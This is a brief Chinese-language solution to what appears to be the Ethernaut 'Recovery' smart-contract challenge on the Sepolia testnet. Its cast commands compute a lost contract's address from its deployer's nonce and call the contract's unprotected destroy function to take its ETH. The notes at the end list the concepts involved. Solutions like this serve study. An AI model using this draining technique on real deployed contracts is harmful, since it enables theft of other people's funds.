# 18-Recovery
```
# 步骤 1: 计算 SimpleToken 合约地址 //nonce不一定为1 可以结合区块浏览器确认或者编程获取地址
SIMPLE_TOKEN=$(cast compute-address --nonce 1 $Recovery_ADDRESS)
//0x59b73c1025C305Ed13bD0ed2Ce755e9859c3991d
echo "SimpleToken address: $SIMPLE_TOKEN"
# 步骤 2: 验证合约确实存在
cast code $SIMPLE_TOKEN --rpc-url $sepolia_rpc
# 步骤 3: 检查合约余额
cast balance $SIMPLE_TOKEN --rpc-url $sepolia_rpc
# 步骤 4: 调用 destroy 函数，将 ETH 转到你的地址
cast send $SIMPLE_TOKEN "destroy(address)" $YOUR_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
```

### 考察点：
- 合约地址的确定性计算
- RLP 编码理解
- 区块链浏览器的使用
- CREATE vs CREATE2
- selfdestruct 的使用
